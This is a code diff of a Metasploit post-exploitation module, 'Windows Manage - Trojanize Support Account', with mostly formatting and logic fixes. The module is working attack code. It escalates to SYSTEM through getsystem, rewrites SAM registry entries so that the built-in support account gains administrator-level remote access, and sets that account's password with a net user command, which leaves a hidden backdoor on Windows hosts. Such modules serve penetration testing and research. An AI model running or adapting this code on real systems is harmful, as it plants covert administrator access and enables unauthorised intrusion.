@@ -9,36 +9,38 @@ class Metasploit3 < Msf::Post
 
 	def initialize(info={})
 		super( update_info( info,
-				'Name'          => 'Windows Manage - Trojanize support account',
-				'Description'   => %q{
-							This module enables alternative access to servers and workstations
-							by modifying the support account's properties. It will enable
-							the account for remote access as the administrator user while
-							taking advantage of some weird behavior in lusrmgr.msc. It will
-							check if sufficient privileges are available for registry operations,
-							otherwise it exits.
-				},
-				'License'       => MSF_LICENSE,
-				'Author'        => 'salcho <salchoman[at]gmail.com>',
-				'Platform'      => [ 'win' ],
-				'SessionTypes'  => [ 'meterpreter' ],
-				'References'	=> [ 'http://xangosec.blogspot.com/2013/06/trojanizing-windows.html' ]
-			))
-			register_options(
-			[
-				OptString.new('PASSWORD',  [true, 'Password of the support user account', 'password']),
-				OptBool.new('GETSYSTEM',   [true,  'Attempt to get SYSTEM privilege on the target host.', true])
-			], self.class)
+			'Name'          => 'Windows Manage - Trojanize Support Account',
+			'Description'   => %q{
+				This module enables alternative access to servers and workstations
+				by modifying the support account's properties. It will enable
+				the account for remote access as the administrator user while
+				taking advantage of some weird behavior in lusrmgr.msc. It will
+				check if sufficient privileges are available for registry operations,
+				otherwise it exits.
+			},
+			'License'       => MSF_LICENSE,
+			'Author'        => 'salcho <salchoman[at]gmail.com>',
+			'Platform'      => [ 'win' ],
+			'SessionTypes'  => [ 'meterpreter' ],
+			'References'	=> [ 'http://xangosec.blogspot.com/2013/06/trojanizing-windows.html' ]
+		))
+
+		register_options(
+		[
+			OptString.new('PASSWORD',  [true, 'Password of the support user account', 'password']),
+			OptBool.new('GETSYSTEM',   [true,  'Attempt to get SYSTEM privilege on the target host.', false])
+		], self.class)
 	end
 
 	def run
 		reg_key = 'HKLM\\SAM\\SAM\\Domains\\Account\\Users'
 
-		if (is_system?())
-			if(datastore['GETSYSTEM'])
+		unless (is_system?())
+			if (datastore['GETSYSTEM'])
+				print_status("Trying to get system...")
 				res = session.priv.getsystem
 				unless res[0]
-					print_error("Unable to get system!")
+					print_error("Unable to get system! You need to run this script.")
 					return
 				else
 					print_good("Got system!")
@@ -106,7 +108,7 @@ class Metasploit3 < Msf::Post
 
 			print_status("Setting password to #{datastore['PASSWORD']}")
 			cmd = cmd_exec('cmd.exe', "/c net user support_388945a0 #{datastore['PASSWORD']}")
-			print_status("#{cmd}")
+			vprint_status("#{cmd}")
 		end
 	end
 
@@ -125,5 +127,4 @@ class Metasploit3 < Msf::Post
 		f[0x30, 2] = hex
 		return f
 	end
-		
 end
